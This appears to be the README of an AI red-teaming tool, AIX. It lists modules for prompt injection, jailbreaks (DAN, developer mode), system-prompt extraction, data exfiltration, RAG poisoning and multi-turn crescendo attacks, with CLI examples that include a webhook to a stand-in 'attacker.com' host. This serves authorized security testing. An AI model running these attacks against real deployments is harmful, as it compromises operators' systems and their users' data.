# AIX - AI eXploit Framework

```
    ▄▀█ █ ▀▄▀
    █▀█ █ █ █  v1.0.0

    AI Security Testing Framework
```

**The first comprehensive AI/LLM security testing tool.**

[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

---

## What is AIX?

AIX is an automated security testing framework for AI/LLM endpoints. It provides penetration testers and red teamers with the tools to assess AI systems for vulnerabilities including:

- **Prompt Injection** - Direct and indirect injection attacks
- **Jailbreaking** - Bypass AI safety restrictions
- **System Prompt Extraction** - Extract hidden instructions
- **Data Leakage** - Training data and PII extraction
- **Data Exfiltration** - Test exfil channels (markdown, links)
- **Agent Exploitation** - Tool abuse and privilege escalation
- **DoS Attacks** - Token exhaustion and resource abuse
- **Fuzzing** - Edge cases and encoding attacks
- **Memory Attacks** - Context manipulation and poisoning
- **RAG Attacks** - Knowledge base and retrieval vulnerabilities
- **Multi-Turn Attacks** - Conversation-based exploitation (crescendo, trust building, context poisoning)

---

## Installation

```bash
# Clone the repository
git clone https://github.com/r08t/aix-framework.git
cd aix-framework
# Install script
chmod +x install.sh
./install.sh

# OR 

# Install dependencies
pip install -r requirements.txt
# Install AIX
pip install -e .

# Verify installation
aix --version
```

---

## Quick Start

```bash
# Basic reconnaissance
aix recon https://api.target.com/chat

# Test for prompt injection
aix inject https://api.target.com/chat -k sk-xxx

# Run all modules
aix scan https://api.target.com/chat -k sk-xxx

# Use with Burp Suite request file
aix inject -r request.txt -p "messages[0].content"

# Generate HTML report
aix db --export report.html
```

---

## Modules

### recon - Reconnaissance
Discover AI endpoint details including API structure, authentication, input filters, model fingerprinting, and rate limits.

```bash
aix recon https://company.com/chatbot
aix recon -r request.txt -p "messages[0].content"
aix recon https://api.company.com -o profile.json
```

### inject - Prompt Injection
Test for prompt injection vulnerabilities including direct injection, indirect injection, context manipulation, and instruction override.

```bash
aix inject https://api.target.com -k sk-xxx
aix inject -r request.txt -p "messages[0].content"
aix inject --profile company.com --evasion aggressive
```

### jailbreak - Bypass Restrictions
Test restriction bypass techniques including DAN variants, character roleplay, developer mode, and hypothetical framing.

```bash
aix jailbreak https://chat.company.com
aix jailbreak -r request.txt -p "messages[0].content"
aix jailbreak --profile company.com --test-harmful
```

### extract - System Prompt Extraction
Extract hidden system prompts using direct extraction, roleplay extraction, translation tricks, and repeat/format abuse.

```bash
aix extract https://api.target.com -k sk-xxx
aix extract -r request.txt -p "messages[0].content"
aix extract --profile company.com
```

### leak - Training Data Extraction
Test for data leakage including PII in responses, memorized training data, RAG document leakage, and model architecture info.

```bash
aix leak https://api.target.com -k sk-xxx
aix leak -r request.txt -p "messages[0].content"
aix leak --profile company.com
```

### exfil - Data Exfiltration
Test data exfiltration channels including markdown image injection, link injection, hidden iframes, and webhook callbacks.

```bash
aix exfil https://api.target.com -k sk-xxx --webhook https://attacker.com
aix exfil -r request.txt -p "messages[0].content"
aix exfil --profile company.com
```

### agent - Agent Exploitation
Test AI agent vulnerabilities including tool abuse, unauthorized actions, privilege escalation, and code execution.

```bash
aix agent https://agent.target.com -k sk-xxx
aix agent -r request.txt -p "messages[0].content"
aix agent --profile company.com
```

### dos - Denial of Service
Test resource exhaustion including token exhaustion, rate limit testing, infinite loop prompts, and memory exhaustion.

```bash
aix dos https://api.target.com -k sk-xxx
aix dos -r request.txt -p "messages[0].content"
aix dos --profile company.com
```

### fuzz - Fuzzing
Test edge cases and malformed input including unicode fuzzing, format string attacks, boundary testing, and encoding attacks.

```bash
aix fuzz https://api.target.com -k sk-xxx
aix fuzz -r request.txt -p "messages[0].content"
aix fuzz --profile company.com --iterations 500
```

### memory - Memory Attacks
Test memory and context vulnerabilities including context window overflow, conversation history poisoning, persistent memory manipulation, context bleeding, and recursive attacks.

```bash
aix memory https://api.target.com -k sk-xxx
aix memory -r request.txt -p "messages[0].content"
```

### rag - RAG Attacks
Test RAG (Retrieval-Augmented Generation) specific vulnerabilities including indirect prompt injection via documents, context poisoning, source manipulation, retrieval bypass, knowledge base extraction, and chunk boundary attacks.

```bash
aix rag https://api.target.com -k sk-xxx
aix rag -r request.txt -p "messages[0].content"
aix rag --profile company.com
```

**RAG Attack Categories:**
| Category | Description | Risk |
|----------|-------------|------|
| Indirect Injection | Instructions hidden in documents that get retrieved | CRITICAL |
| Context Poisoning | Adversarial content injected via retrieval | CRITICAL |
| Source Manipulation | Extract or spoof document sources/citations | HIGH |
| Retrieval Bypass | Make LLM ignore retrieved documents | HIGH |
| KB Extraction | Extract info about the knowledge base | MEDIUM |
| Chunk Boundary | Exploit document chunking logic | MEDIUM |

### multiturn - Multi-Turn Attacks
Advanced attacks that exploit conversation context across multiple turns. These attacks bypass single-shot defenses by building context, trust, or injecting instructions gradually.

```bash
aix multiturn https://api.target.com -k sk-xxx
aix multiturn -r request.txt -p "messages[0].content"
aix multiturn https://api.target.com --category crescendo --level 3
aix multiturn --profile company.com --max-turns 5 --turn-delay 1.0
```

**Multi-Turn Attack Categories:**
| Category | Description | Risk |
|----------|-------------|------|
| Crescendo | Gradually escalate from benign to malicious across turns | CRITICAL |
| Trust Building | Establish rapport and helpfulness before payload delivery | HIGH |
| Context Poisoning | Define terms/concepts early, abuse them in later turns | HIGH |
| Role Lock | Deep persona establishment that persists across turns | HIGH |
| Memory Injection | Inject false memories of previous conversations | MEDIUM |
| Instruction Layering | Stack partial instructions across turns, combine at end | CRITICAL |
| Cognitive Overload | Overwhelm with complexity before slipping in attack | MEDIUM |
| Authority Transfer | Establish expert authority, then leverage it | MEDIUM |

**Multi-Turn Specific Options:**
| Option | Description |
|--------|-------------|
| `--category` | Filter by attack category (crescendo, trust_building, etc.) |
| `--max-turns` | Maximum turns per sequence (default: 10) |
| `--turn-delay` | Delay between turns in seconds (default: 0.5) |

### scan - Full Scan
Run all modules against a target for comprehensive security assessment.

```bash
aix scan https://api.target.com -k sk-xxx
aix scan -r request.txt -p "messages[0].content"
aix scan --profile company.com --evasion aggressive
```

---

## Common Options

| Option | Short | Description |
|--------|-------|-------------|
| `--request` | `-r` | Request file (Burp Suite format) |
| `--param` | `-p` | Parameter path for injection (e.g., `messages[0].content`) |
| `--key` | `-k` | API key for direct API access |
| `--profile` | `-P` | Use saved profile |
| `--verbose` | `-v` | Verbose output (`-v`: reasons, `-vv`: debug) |
| `--output` | `-o` | Output file for results |
| `--proxy` | | HTTP proxy for outbound requests (host:port) |
| `--cookie` | `-C` | Cookies for authentication (`key=value; ...`) |
| `--headers` | `-H` | Custom headers (`key:value; ...`) |
| `--format` | `-F` | Request body format (`json`, `form`, `multipart`) |
| `--level` | | Test level (1-5, higher = more tests) |
| `--risk` | | Risk level (1-3, higher = riskier tests) |
| `--show-response` | | Show AI response for findings |
| `--verify-attempts` | `-va` | Number of verification attempts |

### Session Refresh Options
| Option | Description |
|--------|-------------|
| `--refresh-url` | URL to fetch new session ID if expired |
| `--refresh-regex` | Regex to extract session ID from refresh response |
| `--refresh-param` | Parameter to update with new session ID |
| `--refresh-error` | String/Regex in response body that triggers refresh |

### LLM Evaluation Options
| Option | Description |
|--------|-------------|
| `--eval-url` | URL for secondary LLM evaluation |
| `--eval-key` | API key for secondary LLM |
| `--eval-model` | Model for secondary LLM |
| `--eval-provider` | Provider (`openai`, `anthropic`, `ollama`, `gemini`) |

---

## Using Burp Suite Requests

Export a request from Burp Suite and use it with AIX:

```bash
# Save request from Burp Suite to request.txt
aix inject -r request.txt -p "messages[0].content"
```

The `-p` parameter specifies the JSON path to the injection point. Examples:
- `messages[0].content` - First message content
- `prompt` - Direct prompt field
- `input.text` - Nested input field

---

## Database & Reporting

```bash
# View all results
aix db

# Filter by target
aix db --target company.com

# Filter by module
aix db --module inject

# Export HTML report
aix db --export report.html

# Clear database
aix db --clear
```

---

## Evasion Levels

| Level | Description |
|-------|-------------|
| `none` | No evasion, raw payloads |
| `light` | Basic obfuscation (default) |
| `aggressive` | Heavy encoding and bypass techniques |

```bash
aix inject https://target.com --evasion aggressive
```

---

## Contributing

Contributions are welcome! Please feel free to submit issues and pull requests.

### Adding Payloads

1. Fork the repository
2. Add payloads to the appropriate JSON file in `aix/payloads/`
3. Follow the payload structure:
```json
{
    "name": "payload_name",
    "payload": "The actual payload text",
    "indicators": ["success", "indicators", "to", "match"],
    "severity": "CRITICAL|HIGH|MEDIUM|LOW",
    "category": "category_name",
    "level": 1,
    "risk": 1
}
```
4. Test against safe targets
5. Submit pull request

### Adding Modules

1. Create module in `aix/modules/`
2. Create payloads in `aix/payloads/`
3. Update `aix/modules/__init__.py`
4. Add CLI command in `aix/cli.py`

---

## Disclaimer

This tool is intended for authorized security testing only. Always obtain proper authorization before testing AI systems. The authors are not responsible for misuse of this tool.

**Only use AIX on systems you have permission to test.**

---

## License

MIT License - see [LICENSE](LICENSE) for details.

---

**Made with ❤️ by the r08t**

